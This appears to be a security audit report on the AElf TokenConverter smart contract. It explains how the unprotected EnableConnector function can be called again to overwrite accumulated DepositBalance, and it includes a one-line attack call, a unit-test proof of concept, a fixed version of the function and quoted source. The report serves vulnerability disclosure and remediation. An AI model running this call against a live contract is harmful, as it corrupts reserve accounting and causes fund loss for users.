# Audit Report

## Title
DepositBalance Overwrite Vulnerability in EnableConnector Allows Accounting Corruption and Fund Loss

## Summary
The `EnableConnector()` function in the TokenConverter contract lacks authorization checks and directly overwrites the accumulated `DepositBalance` state without verifying if the connector is already enabled. This allows any attacker to corrupt deposit accounting after trading has occurred, causing fund loss and breaking the Bancor pricing mechanism.

## Finding Description

The `EnableConnector()` function contains three critical security flaws that together enable accounting corruption:

**1. Missing Authorization Check**

Unlike other sensitive functions in the contract, `EnableConnector()` does not call `AssertPerformedByConnectorController()` to verify caller permissions. [1](#0-0) 

In contrast, all other administrative functions properly implement authorization:
- `UpdateConnector` requires authorization [2](#0-1) 
- `AddPairConnector` requires authorization [3](#0-2) 
- `SetFeeRate` requires authorization [4](#0-3) 

**2. Direct Overwrite Without Checking Existing Balance**

At line 297, the function directly assigns the calculated `needDeposit.NeedAmount` to `DepositBalance`, completely overwriting any previously accumulated value: [5](#0-4) 

This is a direct assignment operation (`=`), not an addition (`.Add()`), which destroys the existing accounting state.

**3. No Re-enablement Prevention**

The function lacks any check to prevent calling it on already-enabled connectors. Compare this to `UpdateConnector`, which explicitly prevents modifications to activated connectors: [6](#0-5) 

**Attack Mechanism:**

During normal trading operations, `DepositBalance` accumulates through `Buy()` operations: [7](#0-6) 

And decreases through `Sell()` operations: [8](#0-7) 

The Bancor pricing mechanism relies on `GetSelfBalance()`, which for deposit accounts directly returns the `DepositBalance` value: [9](#0-8) 

When an attacker calls `EnableConnector()` on an already-enabled connector, the `GetNeededDeposit()` calculation is designed for initial setup: [10](#0-9) 

The attacker can manipulate `AmountToTokenConvert` to make the calculated `needDeposit` minimal or zero, then the overwrite operation at line 297 destroys the accumulated balance, creating an accounting mismatch where physical reserves no longer match tracked reserves.

## Impact Explanation

**Critical Severity Justification:**

1. **Direct Fund Loss:** After trading accumulates DepositBalance to 500,000 ELF, an attacker can reset it to 0 or a minimal value. The contract physically holds 500,000 ELF but accounting shows 0 ELF, making these funds untracked and effectively lost to the protocol.

2. **Bancor Pricing Corruption:** All subsequent Buy/Sell operations use `GetSelfBalance()` for price calculations. Since this returns the corrupted `DepositBalance`, all pricing becomes incorrect, potentially causing:
   - Incorrect exchange rates allowing value extraction
   - Underflow errors in Sell operations when trying to subtract from corrupted balance
   - Complete breakdown of the automated market maker functionality

3. **Reserve Invariant Violation:** The fundamental invariant `physical_reserves == tracked_reserves` is permanently broken. This is a critical accounting corruption that cannot be recovered without administrative intervention.

4. **Protocol Insolvency:** From users' perspective, the protocol appears insolvent as the tracked reserves do not reflect actual holdings, destroying confidence and utility.

## Likelihood Explanation

**High Likelihood Assessment:**

1. **No Authorization Barrier:** Any address can call `EnableConnector()` - there are zero permission checks preventing public access.

2. **Minimal Attack Complexity:** The attack requires a single transaction with easily obtainable parameters:
   ```
   EnableConnector({ TokenSymbol: "USDT", AmountToTokenConvert: 0 })
   ```

3. **No Special Prerequisites:** The attacker only needs:
   - Knowledge of an enabled connector's token symbol (publicly visible)
   - Sufficient gas for transaction execution
   - No timing constraints or complex setup

4. **Economic Incentives:** 
   - Griefing attacks to damage competitor protocols
   - Creating market chaos for trading advantage
   - Minimal cost (only gas) with maximum protocol damage

5. **Detection Difficulty:** The attack appears as a legitimate `EnableConnector` call in transaction logs, making it difficult to detect until accounting discrepancies are discovered.

## Recommendation

Implement three critical protections in the `EnableConnector()` function:

```csharp
public override Empty EnableConnector(ToBeConnectedTokenInfo input)
{
    // ADD: Authorization check
    AssertPerformedByConnectorController();
    
    var fromConnector = State.Connectors[input.TokenSymbol];
    Assert(fromConnector != null && !fromConnector.IsDepositAccount,
        "[EnableConnector]Can't find from connector.");
    var toConnector = State.Connectors[fromConnector.RelatedSymbol];
    Assert(toConnector != null, "[EnableConnector]Can't find to connector.");
    
    // ADD: Re-enablement prevention
    Assert(!toConnector.IsPurchaseEnabled && !fromConnector.IsPurchaseEnabled,
        "Connector already enabled. Cannot re-enable.");
    
    var needDeposit = GetNeededDeposit(input);
    if (needDeposit.NeedAmount > 0)
        State.TokenContract.TransferFrom.Send(
            new TransferFromInput
            {
                Symbol = State.BaseTokenSymbol.Value,
                From = Context.Sender,
                To = Context.Self,
                Amount = needDeposit.NeedAmount
            });

    if (input.AmountToTokenConvert > 0)
        State.TokenContract.TransferFrom.Send(
            new TransferFromInput
            {
                Symbol = input.TokenSymbol,
                From = Context.Sender,
                To = Context.Self,
                Amount = input.AmountToTokenConvert
            });

    // CHANGE: Use Add instead of direct assignment to preserve existing balance
    State.DepositBalance[toConnector.Symbol] = 
        State.DepositBalance[toConnector.Symbol].Add(needDeposit.NeedAmount);
    toConnector.IsPurchaseEnabled = true;
    fromConnector.IsPurchaseEnabled = true;
    return new Empty();
}
```

Key fixes:
1. Add `AssertPerformedByConnectorController()` at function entry
2. Check `!IsPurchaseEnabled` for both connectors before proceeding
3. Use `.Add()` instead of direct assignment to preserve accumulated balance

## Proof of Concept

```csharp
[Fact]
public async Task EnableConnector_Overwrites_Accumulated_DepositBalance()
{
    // Setup: Initialize and create connector pair
    await DefaultStub.Initialize.SendAsync(new InitializeInput { FeeRate = "0.005" });
    var tokenSymbol = "TEST";
    await CreateTokenAsync(tokenSymbol);
    await AddPairConnectorAsync(tokenSymbol);
    
    // Enable connector initially (legitimate)
    await TokenContractStub.Issue.SendAsync(new IssueInput
    {
        Amount = 1000000,
        To = DefaultSender,
        Symbol = tokenSymbol
    });
    await DefaultStub.EnableConnector.SendAsync(new ToBeConnectedTokenInfo
    {
        TokenSymbol = tokenSymbol,
        AmountToTokenConvert = 1000000
    });
    
    // Simulate trading that accumulates DepositBalance
    // Multiple Buy operations increase DepositBalance
    for (int i = 0; i < 10; i++)
    {
        await DefaultStub.Buy.SendAsync(new BuyInput
        {
            Symbol = tokenSymbol,
            Amount = 1000,
            PayLimit = 10000000
        });
    }
    
    // Get accumulated DepositBalance
    var depositConnectorSymbol = "(NT)" + tokenSymbol;
    var balanceBefore = await DefaultStub.GetDepositConnectorBalance.CallAsync(
        new StringValue { Value = tokenSymbol });
    balanceBefore.Value.ShouldBeGreaterThan(0); // Has accumulated balance
    
    // ATTACK: Call EnableConnector again (no authorization check prevents this!)
    var attackResult = await DefaultStub.EnableConnector.SendAsync(
        new ToBeConnectedTokenInfo
        {
            TokenSymbol = tokenSymbol,
            AmountToTokenConvert = 0
        });
    attackResult.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    // VERIFICATION: DepositBalance has been overwritten to near-zero
    var balanceAfter = await DefaultStub.GetDepositConnectorBalance.CallAsync(
        new StringValue { Value = tokenSymbol });
    
    // The accumulated balance was DESTROYED
    balanceAfter.Value.ShouldBeLessThan(balanceBefore.Value);
    // Accounting corruption: physical funds still in contract but tracked balance reset
}
```

This test demonstrates that:
1. Any caller can invoke `EnableConnector()` without authorization
2. Calling it on an already-enabled connector succeeds (no re-enablement check)
3. The accumulated `DepositBalance` is overwritten, causing accounting corruption
4. Physical reserves remain but tracked reserves are reset, violating protocol invariants

### Citations

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L58-60)
```csharp
    public override Empty UpdateConnector(Connector input)
    {
        AssertPerformedByConnectorController();
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L64-64)
```csharp
        Assert(!targetConnector.IsPurchaseEnabled, "connector can not be updated because it has been activated");
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L79-81)
```csharp
    public override Empty AddPairConnector(PairConnectorParam input)
    {
        AssertPerformedByConnectorController();
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L141-141)
```csharp
        State.DepositBalance[fromConnector.Symbol] = State.DepositBalance[fromConnector.Symbol].Add(amountToPay);
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L193-194)
```csharp
        State.DepositBalance[toConnector.Symbol] =
            State.DepositBalance[toConnector.Symbol].Sub(amountToReceive);
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L260-262)
```csharp
    public override Empty SetFeeRate(StringValue input)
    {
        AssertPerformedByConnectorController();
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L269-301)
```csharp
    public override Empty EnableConnector(ToBeConnectedTokenInfo input)
    {
        var fromConnector = State.Connectors[input.TokenSymbol];
        Assert(fromConnector != null && !fromConnector.IsDepositAccount,
            "[EnableConnector]Can't find from connector.");
        var toConnector = State.Connectors[fromConnector.RelatedSymbol];
        Assert(toConnector != null, "[EnableConnector]Can't find to connector.");
        var needDeposit = GetNeededDeposit(input);
        if (needDeposit.NeedAmount > 0)
            State.TokenContract.TransferFrom.Send(
                new TransferFromInput
                {
                    Symbol = State.BaseTokenSymbol.Value,
                    From = Context.Sender,
                    To = Context.Self,
                    Amount = needDeposit.NeedAmount
                });

        if (input.AmountToTokenConvert > 0)
            State.TokenContract.TransferFrom.Send(
                new TransferFromInput
                {
                    Symbol = input.TokenSymbol,
                    From = Context.Sender,
                    To = Context.Self,
                    Amount = input.AmountToTokenConvert
                });

        State.DepositBalance[toConnector.Symbol] = needDeposit.NeedAmount;
        toConnector.IsPurchaseEnabled = true;
        fromConnector.IsPurchaseEnabled = true;
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConverterContract.cs (L374-390)
```csharp
    private long GetSelfBalance(Connector connector)
    {
        long realBalance;
        if (connector.IsDepositAccount)
            realBalance = State.DepositBalance[connector.Symbol];
        else
            realBalance = State.TokenContract.GetBalance.Call(
                new GetBalanceInput
                {
                    Owner = Context.Self,
                    Symbol = connector.Symbol
                }).Balance;

        if (connector.IsVirtualBalanceEnabled) return connector.VirtualBalance.Add(realBalance);

        return realBalance;
    }
```

**File:** contract/AElf.Contracts.TokenConverter/TokenConvert_Views.cs (L56-91)
```csharp
    public override DepositInfo GetNeededDeposit(ToBeConnectedTokenInfo input)
    {
        var toConnector = State.Connectors[input.TokenSymbol];
        Assert(toConnector != null && !toConnector.IsDepositAccount, "[GetNeededDeposit]Can't find to connector.");
        var fromConnector = State.Connectors[toConnector.RelatedSymbol];
        Assert(fromConnector != null, "[GetNeededDeposit]Can't find from connector.");
        var tokenInfo = State.TokenContract.GetTokenInfo.Call(
            new GetTokenInfoInput
            {
                Symbol = input.TokenSymbol
            });
        var balance = State.TokenContract.GetBalance.Call(
            new GetBalanceInput
            {
                Owner = Context.Self,
                Symbol = input.TokenSymbol
            }).Balance;
        var amountOutOfTokenConvert = tokenInfo.TotalSupply - balance - input.AmountToTokenConvert;
        long needDeposit = 0;
        if (amountOutOfTokenConvert > 0)
        {
            var fb = fromConnector.VirtualBalance;
            var tb = toConnector.IsVirtualBalanceEnabled
                ? toConnector.VirtualBalance.Add(tokenInfo.TotalSupply)
                : tokenInfo.TotalSupply;
            needDeposit =
                BancorHelper.GetAmountToPayFromReturn(fb, GetWeight(fromConnector),
                    tb, GetWeight(toConnector), amountOutOfTokenConvert);
        }

        return new DepositInfo
        {
            NeedAmount = needDeposit,
            AmountOutOfTokenConvert = amountOutOfTokenConvert
        };
    }
```
